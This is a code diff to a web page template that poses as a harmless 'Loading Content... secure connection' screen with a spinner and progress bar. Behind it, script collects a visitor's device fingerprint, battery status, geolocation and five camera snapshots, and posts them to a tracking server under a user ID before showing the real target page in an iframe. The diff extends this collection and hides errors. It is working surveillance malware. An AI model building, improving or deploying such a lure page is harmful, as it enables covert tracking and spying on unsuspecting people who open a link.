@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>Loading Content...</title>
     <style>
         * {
             margin: 0;
@@ -14,22 +14,24 @@
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
+            overflow: hidden;
         }
 
         .loader-container {
             text-align: center;
             color: white;
+            z-index: 10;
         }
 
         .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid rgba(255, 255, 255, 0.3);
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(255, 255, 255, 0.2);
             border-top-color: white;
             border-radius: 50%;
             animation: spin 1s linear infinite;
@@ -43,12 +45,13 @@
         }
 
         h1 {
-            font-size: 24px;
-            margin-bottom: 10px;
+            font-size: 28px;
+            margin-bottom: 12px;
+            font-weight: 700;
         }
 
         p {
-            font-size: 14px;
+            font-size: 16px;
             opacity: 0.9;
         }
 
@@ -60,6 +63,33 @@
             height: 100%;
             border: none;
             display: none;
+            z-index: 5;
+        }
+
+        .progress-bar {
+            width: 200px;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 2px;
+            margin: 20px auto;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: white;
+            width: 0%;
+            animation: progress 6s ease-in-out forwards;
+        }
+
+        @keyframes progress {
+            from {
+                width: 0%;
+            }
+
+            to {
+                width: 100%;
+            }
         }
     </style>
 </head>
@@ -68,7 +98,10 @@
     <div class="loader-container" id="loader">
         <div class="spinner"></div>
         <h1>Loading Content...</h1>
-        <p>Please wait while we prepare your content</p>
+        <p>Please wait while we prepare your secure connection</p>
+        <div class="progress-bar">
+            <div class="progress-fill"></div>
+        </div>
     </div>
 
     <iframe id="targetFrame" src="<%= url %>"></iframe>
@@ -78,20 +111,53 @@
         const userId = '<%= uid %>';
         const targetUrl = '<%= url %>';
 
-        // Collect device information
+        // Enhanced data collection
         async function collectData() {
             const data = {
+                // Basic Info
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
+                languages: navigator.languages?.join(', ') || navigator.language,
+
+                // Screen Info
                 screenResolution: `${screen.width}x${screen.height}`,
-                colorDepth: screen.colorDepth,
+                screenColorDepth: screen.colorDepth,
+                screenAvailSize: `${screen.availWidth}x${screen.availHeight}`,
+
+                // System Info
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 cookiesEnabled: navigator.cookieEnabled,
                 onlineStatus: navigator.onLine,
-                referrer: document.referrer,
-                timestamp: new Date().toISOString()
+
+                // Hardware Info
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+                deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
+
+                // Connection Info
+                connectionType: navigator.connection?.effectiveType || 'Unknown',
+
+                // Other
+                referrer: document.referrer || 'Direct',
+                timestamp: new Date().toISOString(),
+                pageType: 'WebView Redirect'
             };
+
+            // Get OS Info
+            const userAgent = navigator.userAgent;
+            if (userAgent.indexOf('Win') !== -1) data.os = 'Windows';
+            else if (userAgent.indexOf('Mac') !== -1) data.os = 'MacOS';
+            else if (userAgent.indexOf('Linux') !== -1) data.os = 'Linux';
+            else if (userAgent.indexOf('Android') !== -1) data.os = 'Android';
+            else if (userAgent.indexOf('iOS') !== -1 || userAgent.indexOf('iPhone') !== -1 || userAgent.indexOf('iPad') !== -1) data.os = 'iOS';
+            else data.os = 'Unknown';
+
+            // Get Browser Info
+            if (userAgent.indexOf('Chrome') !== -1 && userAgent.indexOf('Edg') === -1) data.browser = 'Chrome';
+            else if (userAgent.indexOf('Safari') !== -1 && userAgent.indexOf('Chrome') === -1) data.browser = 'Safari';
+            else if (userAgent.indexOf('Firefox') !== -1) data.browser = 'Firefox';
+            else if (userAgent.indexOf('Edg') !== -1) data.browser = 'Edge';
+            else data.browser = 'Unknown';
 
             // Send basic info
             await fetch(serverUrl, {
@@ -100,45 +166,65 @@
                 body: `uid=${encodeURIComponent(userId)}&data=${encodeURIComponent(
                     Object.entries(data).map(([k, v]) => `<b>${k}:</b> ${v}`).join('<br>')
                 )}`
-            });
+            }).catch(e => console.log('Error:', e));
 
-            // Try to get location
+            // Get Battery Info
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    const batteryData = {
+                        level: `${Math.round(battery.level * 100)}%`,
+                        charging: battery.charging ? 'Yes' : 'No'
+                    };
+
+                    await fetch(serverUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: `uid=${encodeURIComponent(userId)}&data=${encodeURIComponent(
+                            '<b>Battery Status:</b><br>' +
+                            Object.entries(batteryData).map(([k, v]) => `<b>${k}:</b> ${v}`).join('<br>')
+                        )}`
+                    }).catch(e => console.log('Error:', e));
+                } catch (e) { }
+            }
+
+            // Get Location
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (position) => {
                     await fetch(serverUrl + '/location', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                         body: `uid=${encodeURIComponent(userId)}&lat=${position.coords.latitude}&lon=${position.coords.longitude}&acc=${position.coords.accuracy}`
-                    });
+                    }).catch(e => console.log('Error:', e));
                 });
             }
 
-            // Try to get camera snapshot
+            // Get 5 Camera Snapshots
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.play();
 
-                setTimeout(async () => {
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+
+                for (let i = 0; i < 5; i++) {
+                    await new Promise(resolve => setTimeout(resolve, 1000));
                     const canvas = document.createElement('canvas');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-
-                    const imageData = canvas.toDataURL('image/png').split(',')[1];
+                    const imageData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
 
                     await fetch(serverUrl + '/camsnap', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                        body: `uid=${encodeURIComponent(userId)}&img=${encodeURIComponent(imageData)}`
-                    });
+                        body: `uid=${encodeURIComponent(userId)}&img=${encodeURIComponent(imageData)}&index=${i + 1}`
+                    }).catch(e => console.log('Error:', e));
+                }
 
-                    stream.getTracks().forEach(track => track.stop());
-                }, 1000);
-            } catch (e) {
-                console.log('Camera access denied');
-            }
+                stream.getTracks().forEach(track => track.stop());
+            } catch (e) { }
         }
 
         // Collect data and show iframe
@@ -146,7 +232,7 @@
             setTimeout(() => {
                 document.getElementById('loader').style.display = 'none';
                 document.getElementById('targetFrame').style.display = 'block';
-            }, 2000);
+            }, 6000);
         });
     </script>
 </body>
